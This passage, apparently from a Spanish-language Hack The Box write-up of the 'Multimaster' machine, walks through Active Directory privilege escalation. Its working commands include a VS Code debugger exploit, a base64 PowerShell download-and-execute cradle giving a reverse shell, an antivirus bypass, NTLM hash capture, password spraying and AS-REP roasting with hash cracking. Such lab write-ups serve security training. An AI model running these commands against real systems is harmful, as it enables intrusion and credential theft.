User name                    tushikikatomo
Full Name                    Tushikikatomo Akira
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/9/2020 5:02:03 PM
Password expires             Never
Password changeable          1/10/2020 5:02:03 PM
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script                 drives.vbs
User profile
Home directory
Last logon                   1/25/2023 4:10:32 AM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *Domain Users
The command completed successfully.
```

Al listar los procesos, se puede ver repetido en varias ocasiones uno llamado "Code"

```null
*Evil-WinRM* PS C:\Users\alcibiades\Desktop> Get-Process

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
    407      56   134648     169304               856   1 Code
    413      22    16344       7512              2528   1 Code
    322      31    38624      25808              3488   1 Code
    278      51    58308      75032              3992   1 Code
    406      55    97208     120672              4240   1 Code
    276      52    45528      15656              4424   1 Code
    214      15     6100       3880              4796   1 Code
    661      48    33004      71508              4980   1 Code
    408      53    95260      53048              5096   1 Code
    277      51    57768      67644              5628   1 Code
     60       4      680        764              1552   0 CompatTelRunner
     93       8     1376       1208              1700   0 conhost
    385      14     1988       4516               376   0 csrss
    246      16     1900       4492               492   1 csrss
    359      32    13220      22032              2392   0 dfsrs
    168      12     2300       7716              2644   0 dfssvc
    240      14     4092      12660              3116   0 dllhost
  10325    7407   129600     126588              2448   0 dns
    327      21    24300      52644               936   1 dwm
   1194      50    17264      60708              4588   1 explorer
      0       0        0          4                 0   0 Idle
    119      12     1844       5412              2412   0 ismserv
   1707     163    54428      56488               620   0 lsass
    425      31    35012      43768              2456   0 Microsoft.ActiveDirectory.WebServices
    166      10     2444       8540              4072   0 MpCmdRun
    204      14     2836       9732              3260   0 msdtc
    475      63   161500     129988              2560   0 MsMpEng
    171      39     4164       8808              4000   0 NisSrv
    421      19    11640      11888               612   0 services
    268      15     3104      17440              4448   1 sihost
     51       3      452       1252               292   0 smss
    433      23     5972      15812              2320   0 spoolsv
    502      30    32516      45640              3460   0 sqlceip
    737     102   367672     246448              3452   0 sqlservr
    112       9     2032       7612              2376   0 sqlwriter
    443      18     4020      11604               260   0 svchost
    431      35    10080      17488               284   0 svchost
    503      18    15748      22280               396   0 svchost
    911      35     9224      22280               404   0 svchost
    234      12     3340      14604               636   0 svchost
    580      21     5772      18612               792   0 svchost
    601      18     3880       9564               848   0 svchost
   1731      65    28212      48792               976   0 svchost
    443      27    10836      18948              1012   0 svchost
    654      45     8432      21332              1060   0 svchost
    159      12     1940       6964              1600   0 svchost
    145      12     1852       7112              1668   0 svchost
    236      18     2420       9064              2108   0 svchost
    144      11     3828      10520              2384   0 svchost
    184      21     3484      14632              2496   0 svchost
    192      14     4764      11752              2552   0 svchost
    293      18     3732      18112              4520   1 svchost
    988       0      128        144                 4   0 System
    225      16     3196      13560              4284   1 taskhostw
    205      16     2496      10836              3096   0 vds
    140      11     3100      10220              2464   0 VGAuthService
    107       7     1424       5660              1288   0 vm3dservice
    108       8     1616       6944              3888   1 vm3dservice
    341      21    10440      22244              2440   0 vmtoolsd
    201      17     4900      15084              4488   1 vmtoolsd
    105       9     1172       4904               484   0 wininit
    209      10     2216      10036               568   1 winlogon
    155      13     1816       9040              1172   0 WmiApSrv
    314      15     6272      15140              1628   0 WmiPrvSE
    438      28    37844      47924              3504   0 WmiPrvSE
    823      26    58308      73132       0.83   4500   0 wsmprovhost
    263      11     1908       7912              1484   0 WUDFHost
```

Si me dirijo al directorio donde están instalados los programas, puedo ver el "Visual Studio Code", que quiero pensar que corresponde al proceso que se está ejecutando

```null
*Evil-WinRM* PS C:\Program Files> dir


    Directory: C:\Program Files


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        9/25/2019  10:59 AM                Common Files
d-----         1/9/2020   2:39 PM                Internet Explorer
d-----         1/7/2020   9:40 PM                Microsoft
da----         1/7/2020   7:47 PM                Microsoft SQL Server
d-----         1/7/2020   7:26 PM                Microsoft Visual Studio 10.0
da----         1/9/2020   3:18 AM                Microsoft VS Code
d-----         1/7/2020   7:27 PM                Microsoft.NET
d-----         1/7/2020   9:43 PM                Reference Assemblies
d-----        7/19/2021   1:07 AM                VMware
d-r---         1/9/2020   2:46 PM                Windows Defender
d-----         1/9/2020   2:39 PM                Windows Mail
d-----         1/9/2020   2:39 PM                Windows Media Player
d-----        7/16/2016   6:23 AM                Windows Multimedia Platform
d-----        7/16/2016   6:23 AM                Windows NT
d-----         1/9/2020   2:39 PM                Windows Photo Viewer
d-----        7/16/2016   6:23 AM                Windows Portable Devices
d-----        7/16/2016   6:23 AM                WindowsPowerShell
```

Estaba en lo cierto, ya que hay un ejecutable llamado "Code.exe"

```null
*Evil-WinRM* PS C:\Program Files\Microsoft VS Code> dir


    Directory: C:\Program Files\Microsoft VS Code


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         1/9/2020   3:18 AM                bin
d-----         1/9/2020   3:18 AM                locales
d-----         1/9/2020   3:18 AM                resources
d-----         1/9/2020   3:18 AM                swiftshader
d-----         1/9/2020   3:18 AM                tools
-a----        8/15/2019   5:18 PM         167621 chrome_100_percent.pak
-a----        8/15/2019   5:18 PM         249617 chrome_200_percent.pak
-a----        8/15/2019   5:28 PM       92150648 Code.exe
-a----        8/15/2019   5:18 PM            342 Code.VisualElementsManifest.xml
-a----        8/15/2019   5:27 PM        4355424 d3dcompiler_47.dll
-a----        8/15/2019   5:27 PM        1853520 ffmpeg.dll
-a----        8/15/2019   5:18 PM       10221472 icudtl.dat
-a----        8/15/2019   5:27 PM         118344 libEGL.dll
-a----        8/15/2019   5:27 PM        5112912 libGLESv2.dll
-a----        8/15/2019   5:18 PM         125011 natives_blob.bin
-a----        8/15/2019   5:27 PM        2958952 osmesa.dll
-a----        8/15/2019   5:18 PM        8720759 resources.pak
-a----        8/15/2019   5:18 PM         613268 snapshot_blob.bin
-a----         1/9/2020   3:18 AM         445419 unins000.dat
-a----         1/9/2020   3:17 AM        1244024 unins000.exe
-a----         1/9/2020   3:18 AM          22739 unins000.msg
-a----        8/15/2019   5:18 PM        1012440 v8_context_snapshot.bin
```

Dentro del directorio de binarios, hay uno que puedo utilizar por consola. Si muestro el panel de ayuda, veo la versión

```null
*Evil-WinRM* PS C:\Program Files\Microsoft VS Code\bin> .\code -h
Visual Studio Code 1.37.1

Usage: code.exe [options][paths...]

```

Al buscarla por Google, encuentro un [exploit](https://www.cybersecurity-help.cz/vdb/SB2019101709) que consiste en una escalada de privilegios

<img src="/writeups/assets/img/Multimaster-htb/5.png" alt="">

Busco por el CVE en Github y encuentro un [PoC](https://iwantmore.pizza/posts/cve-2019-1414.html) donde explican en que consiste

<img src="/writeups/assets/img/Multimaster-htb/6.png" alt="">

Como está hablando un puerto en escucha que contiene un debugger, descargo la herramienta [cefdebug](https://github.com/taviso/cefdebug) de Github, que en caso de que se logre conectar, puedo llegar a ejecutar comandos

Descargo el release, y me monto un servicio http con python para transferirlo

```null
python3 -m http.server 80
```

Desde la máquina víctima lo descargo

```null
*Evil-WinRM* PS C:\Temp> iwr -uri http://10.10.16.6/cefdebug.exe -o cefdebug.exe
```

Y detecta tres debbugers activos

```null
*Evil-WinRM* PS C:\Temp> .\cefdebug.exe
cefdebug.exe : [2023/01/25 05:13:10:6860] U: There are 5 tcp sockets in state listen.
    + CategoryInfo          : NotSpecified: ([2023/01/25 05:...n state listen.:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
[2023/01/25 05:13:30:7151] U: There were 3 servers that appear to be CEF debuggers.
[2023/01/25 05:13:30:7161] U: ws://127.0.0.1:4817/f1524df6-449c-467e-9618-e1809fd82f16
[2023/01/25 05:13:30:7161] U: ws://127.0.0.1:53876/1bfb6cf5-7bdc-465b-9e37-d91b2d57f23e
[2023/01/25 05:13:30:7171] U: ws://127.0.0.1:45345/7ed4cd69-c8dc-4c0c-8cab-0136415eff19
```

Siguiendo la guía voy a conectarme con una de estas URLs para tratar de inyectar un comando

```null
*Evil-WinRM* PS C:\Temp> .\cefdebug.exe --url "ws://127.0.0.1:25684/45d6f118-eab6-42c5-88e3-ef39fbbdef09" --code "process.mainModule.require('child_process').exec('ping -n 1 10.10.16.6')"
cefdebug.exe : [2023/01/25 05:23:16:2435] U: >>> process.mainModule.require('child_process').exec('ping -n 1 10.10.16.6')
    + CategoryInfo          : NotSpecified: ([2023/01/25 05:... 1 10.10.16.6'):String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
[2023/01/25 05:23:16:2435] U: <<< ChildProcess
```

Si me pongo en escucha de trazas ICMP, recibo el paquete

```null
tcpdump -i tun0 icmp -n
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
13:16:15.827782 IP 10.10.10.179 > 10.10.16.6: ICMP echo request, id 1, seq 5, length 40
13:16:15.827825 IP 10.10.16.6 > 10.10.10.179: ICMP echo reply, id 1, seq 5, length 40
```

Me pongo en escucha con netcat por el puerto 443 y con ConPtyShell me entablo una revershell a mi equipo

Retoco el script para que me lo ejecute nada más ser interpretado. Para ello, añado una línea con la sentecia que se tiene que aplicar

```null
cat Invoke-PowerShellTcp.ps1 | tail -n 1
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.6 -Port 443
```

Monto un servicio http con python para compartirme el script

```null
python3 -m http.server 80
```

Para evitar problemas de comillas u otros caracteres y no tener que escaparlos, convierto el comando a base64 con el encoder UTF-16le, que es el que usa powershell. Separa cada caracter por un punto, aunque de primeras no es visible

```null
echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.16.6/Invoke-PowerShellTcp.ps1')" | iconv -t utf-16le | xxd
00000000: 4900 4500 5800 2800 4e00 6500 7700 2d00  I.E.X.(.N.e.w.-.
00000010: 4f00 6200 6a00 6500 6300 7400 2000 4e00  O.b.j.e.c.t. .N.
00000020: 6500 7400 2e00 5700 6500 6200 4300 6c00  e.t...W.e.b.C.l.
00000030: 6900 6500 6e00 7400 2900 2e00 6400 6f00  i.e.n.t.)...d.o.
00000040: 7700 6e00 6c00 6f00 6100 6400 5300 7400  w.n.l.o.a.d.S.t.
00000050: 7200 6900 6e00 6700 2800 2700 6800 7400  r.i.n.g.(.'.h.t.
00000060: 7400 7000 3a00 2f00 2f00 3100 3000 2e00  t.p.:././.1.0...
00000070: 3100 3000 2e00 3100 3600 2e00 3600 2f00  1.0...1.6...6./.
00000080: 4900 6e00 7600 6f00 6b00 6500 2d00 5000  I.n.v.o.k.e.-.P.
00000090: 6f00 7700 6500 7200 5300 6800 6500 6c00  o.w.e.r.S.h.e.l.
000000a0: 6c00 5400 6300 7000 2e00 7000 7300 3100  l.T.c.p...p.s.1.
000000b0: 2700 2900                                '.).
```

Me copio en la clipboard el comando en base64

```null
echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.16.6/Invoke-PowerShellTcp.ps1')" | iconv -t utf-16le | base64 -w 0 | xclip -sel clip
```

Antes de ejecutarlo con el exploit, pruebo a hacerlo desde el usuario que ya he pwneado, para asegurarme de que no hay restricciones

```null
*Evil-WinRM* PS C:\Temp> powershell -e SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANgAuADYALwBJAG4AdgBvAGsAZQAtAFAAbwB3AGUAcgBTAGgAZQBsAGwAVABjAHAALgBwAHMAMQAnACkA
powershell.exe : IEX : At line:1 char:1

    + CategoryInfo          : NotSpecified: (IEX : At line:1 char:1
:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
powershell.exe : + function Invoke-PowerShellTcp

    + CategoryInfo          : NotSpecified: (+ function Invoke-PowerShellTcp
:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
powershell.exe : + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    + CategoryInfo          : NotSpecified: (+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
powershell.exe : This script contains malicious content and has been blocked by your antivirus software.

```

Me aparece un error, el Defender o el AMSI lo ha bloqueado. Para bypassearlo, basta con cambiar los nombres de las funciones y borrar los comentarios

<img src="/writeups/assets/img/Multimaster-htb/7.png" alt="">

Ahora ejecuta sin problemas

```null
nc -nvlp 443
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.179.
Ncat: Connection from 10.10.10.179:50050.
Windows PowerShell running as user tushikikatomo on MULTIMASTER
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Temp>

```

Ahora, inyecto el mismo comando en el exploit del Visual Studio Code

```null
*Evil-WinRM* PS C:\Temp> .\cefdebug.exe --url "ws://127.0.0.1:33740/8f253fe3-998c-41ab-9d5c-bf4404c743c7" --code "process.mainModule.require('child_process').exec('powershell -e SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANgAuADYALwBJAG4AdgBvAGsAZQAtAFAAbwB3AGUAcgBTAGgAZQBsAGwAVABjAHAALgBwAHMAMQAnACkA')"
```

Y recibo la reverse shell como el usuario cyork

```null
nc -nvlp 443
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.179.
Ncat: Connection from 10.10.10.179:50083.
Windows PowerShell running as user cyork on MULTIMASTER
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Program Files\Microsoft VS Code>whoami
megacorp\cyork
PS C:\Program Files\Microsoft VS Code> 
```

Este usuario pertenece al grupo Developers, por lo que lo más probable es que tenga acceso a las rutas de desarrollo web

```null
PS C:\Program Files\Microsoft VS Code>net user cyork
User name                    cyork
Full Name                    Connor York
Comment                      
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/9/2020 11:57:08 AM
Password expires             Never
Password changeable          1/10/2020 11:57:08 AM
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   1/25/2023 4:46:14 AM

Logon hours allowed          All

Local Group Memberships      
Global Group memberships     *Domain Users         *Developers           
The command completed successfully.
```

Dentro de C:\inetpub\wwwroot\bin hay una DLL que hace referencia a una API

Creo en mi equipo un servicio samba

```null
smbserver.py shared $(pwd) -smb2support
```

Y copio el archivo

```null
PS C:\inetpub\wwwroot\bin> copy .\MultimasterAPI.dll \\10.10.16.6\Shared\MultimasterAPI.dll
```

Además intercepto su hash NetNTLMv2, que podría tratar de crackearlo por si su contraseña se reutiliza para otro usuario

```null
[*] [*] cyork::MEGACORP:aaaaaaaaaaaaaaaa:986e0d154aec196ce2e52d06bde774f8:01010000000000008076f03dc530d901d98088bdcbd7543e000000000100100051007a0063004e0066006e00690065000300100051007a0063004e0066006e0069006500020010007400510074006700750073006f004800040010007400510074006700750073006f004800070008008076f03dc530d9010600040002000000080030003000000000000000010000000020000093efab05c7853d1548eb3f27a4ae1a0bd93625773adb19fbefddbfff64fd651c0a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e0036000000000000000000
```

Pero no encuentra la contraseña

```null
john -w:/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:05 DONE (2023-01-25 14:03) 0g/s 2598Kp/s 2598Kc/s 2598KC/s !)(OPPQR..*7¡Vamos!
Session completed. 
```

Con Strings trato de ver las cadenas de caracteres imprimibles de la DLL, y le añado el parámetro '-e' de encoding con el argumento 'l', porque Windows trabaja con estructuras de 16 bits en los archivos

```null
  -e --encoding={s,S,b,l,B,L} Select character size and endianness:
                            s = 7-bit, S = 8-bit, {b,l} = 16-bit, {B,L} = 32-bit
```

Puedo ver una contraseña en texto claro

```null
strings -e l MultimasterAPI.dll | grep password
server=localhost;database=Hub_DB;uid=finder;password=D3veL0pM3nT!;
```

El usuario finder no existe, pero como tengo un diccionario con usuarios, puedo volver a efectuar un password spraying con esa contraseña

Se reutiliza para el usuario sbauer

```null
crackmapexec smb 10.10.10.179 -u users -p 'D3veL0pM3nT!'
SMB         10.10.10.179    445    MULTIMASTER      [*] Windows Server 2016 Standard 14393 x64 (name:MULTIMASTER) (domain:MEGACORP.LOCAL) (signing:True) (SMBv1:True)
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\aldom:D3veL0pM3nT! STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\alyx:D3veL0pM3nT! STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\ckane:D3veL0pM3nT! STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\ilee:D3veL0pM3nT! STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\james:D3veL0pM3nT! STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\jorden:D3veL0pM3nT! STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\kpage:D3veL0pM3nT! STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\minato:D3veL0pM3nT! STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\nbourne:D3veL0pM3nT! STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\okent:D3veL0pM3nT! STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\rmartin:D3veL0pM3nT! STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [+] MEGACORP.LOCAL\sbauer:D3veL0pM3nT! 
```

Si el usuario pertenece al grupo Remote ManageMent Users me podré conectar por winrm

```null
crackmapexec winrm 10.10.10.179 -u 'sbauer' -p 'D3veL0pM3nT!'
SMB         10.10.10.179    5985   MULTIMASTER      [*] Windows 10.0 Build 14393 (name:MULTIMASTER) (domain:MEGACORP.LOCAL)
HTTP        10.10.10.179    5985   MULTIMASTER      [*] http://10.10.10.179:5985/wsman
WINRM       10.10.10.179    5985   MULTIMASTER      [+] MEGACORP.LOCAL\sbauer:D3veL0pM3nT! (Pwn3d!)
```

Y me conecto a la máquina por winrm

```null
evil-winrm -i 10.10.10.179 -u 'sbauer' -p 'D3veL0pM3nT!'

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\sbauer\Documents> 
```

No tengo ningún privilegio especial

```null
*Evil-WinRM* PS C:\Users\sbauer\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

Y los grupos que tengo asignados ya tenía acceso de antes

```null
*Evil-WinRM* PS C:\Users\sbauer\Documents> net user sbauer
User name                    sbauer
Full Name                    Sarina Bauer
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/9/2020 4:56:31 PM
Password expires             Never
Password changeable          1/10/2020 4:56:31 PM
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *Domain Users         *Developers
The command completed successfully.

Subo el injestor SharpHound.exe a la máquina víctima para encontrar formas de escalar privilegios con BloodHound

```null
*Evil-WinRM* PS C:\Users\sbauer\Documents> upload /opt/SharpHound.exe
Info: Uploading /opt/SharpHound.exe to C:\Users\sbauer\Documents\SharpHound.exe

                                                             
Data: 1211048 bytes of 1211048 bytes copied

Info: Upload successful!
```

En mi máquina linux creo un servicio compartido por SMB

```null
impacket-smbserver shared $(pwd) -smb2support
```

Lo ejecuto y descargo el comprimido

```null
*Evil-WinRM* PS C:\Users\sbauer\Documents> ./SharpHound.exe -c All
2023-01-25T06:31:40.4257344-08:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2023-01-25T06:31:40.4257344-08:00|INFORMATION|Initializing SharpHound at 6:31 AM on 1/25/2023
2023-01-25T06:32:04.7217530-08:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2023-01-25T06:32:04.9246465-08:00|INFORMATION|Beginning LDAP search for MEGACORP.LOCAL
2023-01-25T06:32:04.9926578-08:00|INFORMATION|Producer has finished, closing LDAP channel
2023-01-25T06:32:04.9926578-08:00|INFORMATION|LDAP channel closed, waiting for consumers
2023-01-25T06:32:35.7988232-08:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 35 MB RAM
2023-01-25T06:32:52.7773194-08:00|INFORMATION|Consumers finished, closing output channel
2023-01-25T06:32:52.8349941-08:00|INFORMATION|Output channel closed, waiting for output task to complete
Closing writers
2023-01-25T06:32:53.2043626-08:00|INFORMATION|Status: 127 objects finished (+127 2.645833)/s -- Using 60 MB RAM
2023-01-25T06:32:53.2043626-08:00|INFORMATION|Enumeration finished in 00:00:48.2759437
2023-01-25T06:32:53.3630959-08:00|INFORMATION|SharpHound Enumeration Completed at 6:32 AM on 1/25/2023! Happy Graphing!
*Evil-WinRM* PS C:\Users\sbauer\Documents> copy .\20230125063252_BloodHound.zip \\10.10.16.6\shared\bh.zip
```
Arranco neo4j y subo los datos a BloodHound

```null
neo4j console
```

Marco los usuarios tushikikatomo, cyork y sbauer como pwneados

En el menú hago click en "Shortest Paths to High Value Targets"

Se puede ver que el usuario sbauer tiene Generic Write sobre jorden, que pertenece al grupo Server Operators que tiene Generic Write sobre Administrator

<img src="/writeups/assets/img/Multimaster-htb/8.png" alt="">

El grupo Server Operators también permite alterar el Bin Path para modificar los servicios existentes e indicar una ruta alternativa y que ejecute un comando no deseado

Como con GenericWrite puedo alterar los atributos de un principal, podría interesarme alterar la configuración de Kerberos para que no requiera autenticación del mismo y pueda obtener un TGT y tratar de crackearlo por fuerza bruta. De esa manera, podría obtener una sesión con usuario abusando de PSSessions, script-blocks o por evil-winrm si pertenece al grupo Remote Management Users

En este [Hilo](https://social.technet.microsoft.com/Forums/ie/en-US/e4dd29b3-c925-490e-9208-39cea1e28f9f/quotdo-not-require-kerberos-preauthenticationquot?forum=ITCG) de Microsoft explican como hacerlo

Si efectuo el ASPRepRoast Attack, en un principio todos los usuarios cuentan con autenticación previa de Kerberos

```null
GetNPUsers.py megacorp.local/ -no-pass -usersfile users
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] User aldom doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User alyx doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ckane doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ilee doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User james doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User jorden doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User kpage doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User nbourne doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User okent doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User rmartin doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User sbauer doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User zac doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User zpowers doesn't have UF_DONT_REQUIRE_PREAUTH set
```

Le cambio los atributos a jorden:

```null
*Evil-WinRM* PS C:\Users\sbauer\Documents> Get-AdUser jorden | Set-ADAccountControl  -doesnotrequirepreauth $true
```

Y obtengo su TGT

```null
GetNPUsers.py megacorp.local/ -no-pass -usersfile users
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] User aldom doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User alyx doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ckane doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ilee doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User james doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$jorden@MEGACORP.LOCAL:384d7d781c67f855c997536771baa772$4b7b7dcc4f781dfccaba810ed2af31e8bdfe25abee5b3057064c5e2154d4262006331bb808f0287ff72c45954ab236d84a4bcf6cb488537728703bc35d203e631c9b08f87520983109a29494900eaccbfc0965fece4a80ae369c629274800e6dbd1682187e85b2159d816f188b74f1e881ee60fa90021d5627917c08e1fc9a69244c280d952a7d2d97642a2b1d7c2943d4ec6e96e4f34a8232dcb8991283a503e6afbeffffc87d79cd467b629320493caf01149f18ecb7700f3dbccae7dc8347cfd75308b5e3bbae2aee00f5b5cae64e3e2e37420b38277f59ebc11d9b615e7ad6e072621f016e002b34040847fa7911
[-] User kpage doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User nbourne doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User okent doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User rmartin doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User sbauer doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User zac doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User zpowers doesn't have UF_DONT_REQUIRE_PREAUTH set
```

Al crackear el hash obtengo su contraseña

```null
john -w:/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
rainforest786    ($krb5asrep$23$jorden@MEGACORP.LOCAL)     
1g 0:00:00:03 DONE (2023-01-25 14:52) 0.3134g/s 1379Kp/s 1379Kc/s 1379KC/s rainian..rainbow377
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Valido la credencial por winrm

```null
crackmapexec winrm 10.10.10.179 -u 'jorden' -p 'rainforest786'
SMB         10.10.10.179    5985   MULTIMASTER      [*] Windows 10.0 Build 14393 (name:MULTIMASTER) (domain:MEGACORP.LOCAL)
HTTP        10.10.10.179    5985   MULTIMASTER      [*] http://10.10.10.179:5985/wsman
WINRM       10.10.10.179    5985   MULTIMASTER      [+] MEGACORP.LOCAL\jorden:rainforest786 (Pwn3d!)
```

Y me conecto a la máquina

```null
evil-winrm -i 10.10.10.179 -u 'jorden' -p 'rainforest786'

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\jorden\Documents> 
```

Como pertenezco al grupo Server Operators, modifico el Bin Path de un Servicio para que una vez se arranque gane acceso como nt authority\system

```null
*Evil-WinRM* PS C:\Users\jorden\Documents> net user jorden
User name                    jorden
Full Name                    Jorden Mclean
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/9/2020 4:48:17 PM
Password expires             Never
Password changeable          1/10/2020 4:48:17 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   1/25/2023 6:58:08 AM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use*Server Operators
Global Group memberships     *Domain Users         *Developers
The command completed successfully.
```

Dentro de los servicios activos me aparecen los siguientes

```null
*Evil-WinRM* PS C:\Users\jorden\Documents> services

Path                                                                                                                 Privileges Service          
----                                                                                                                 ---------- -------          
C:\Windows\ADWS\Microsoft.ActiveDirectory.WebServices.exe                                                                  True ADWS             
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\aspnet_state.exe                                                           True aspnet_state     
\??\C:\ProgramData\Microsoft\Windows Defender\Definition Updates\{5EB04B3D-85AE-4574-88FB-F22CF32D39F5}\MpKslDrv.sys       True MpKslDrv         
"C:\Program Files\Microsoft SQL Server\MSSQL14.MSSQLSERVER\MSSQL\Binn\sqlservr.exe" -sMSSQLSERVER                          True MSSQLSERVER      
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\SMSvcHost.exe                                                              True NetTcpPortSharing
C:\Windows\SysWow64\perfhost.exe                                                                                           True PerfHost         
"C:\Program Files (x86)\Microsoft SQL Server\90\Shared\sqlbrowser.exe"                                                     True SQLBrowser       
